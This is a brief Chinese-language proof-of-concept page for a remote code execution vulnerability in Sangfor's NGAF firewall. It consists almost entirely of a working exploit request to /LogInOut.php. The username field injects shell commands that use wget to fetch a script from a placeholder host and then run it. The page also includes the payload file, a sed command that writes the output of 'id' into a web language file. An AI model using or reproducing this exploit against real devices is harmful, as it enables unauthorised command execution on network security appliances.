
## 深信服下一代防火墙NGAF RCE漏洞

## POC
```
POST /LogInOut.php HTTP/1.1
Host:
Cookie: PHPSESSID=2e01d2ji93utnsb5abrcm780c2
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Connection: close
Content-Length: 625

type=logged&un=watchTowr;wget http://<host>/cmd.txt;source /virus/dcweb/webapps/cmd.txt&up=0f2df0a6f151e836c8ccd1c2ea3bfbdfb7bfa0d38d438942492bd8f28f3e92939319f932f2f2add6d0d484accdc4c28269b203c4dc77c1da941fa19dae017d44d6ea8cad2572e37c485a8ebcb4bdb510cc86420a50ae45ae07daf5fe9c40fe133f3806cd8f3158ee359766e8e19c9fbbf7e888bf0d7f3952f4d083bd17cd19eb960dadec2835f6f259616f5b2e5942d3a4d1754cbd69696fae60ef18358bf5782dd5ebf377f5642e0583e630660ccac241a615ae21bfc12852a32d0367a899eb010e5d1c33669fc2e9ea3a0ecbf078c22120196a115b4038288063bf99610d3d331acb53e5c8fbd14229a4abdff83cf075a7b97a9bb9dae3586f19256f4262d5&vericode=<correct captcha>
```

Cmd.txt 有效载荷：
```
sed -i s/Lock/"$(id)"/g /virus/dcweb/conf/lang/eng.utf8.lang.app.php
```

![](https://labs.watchtowr.com/content/images/2023/10/image-13.png)
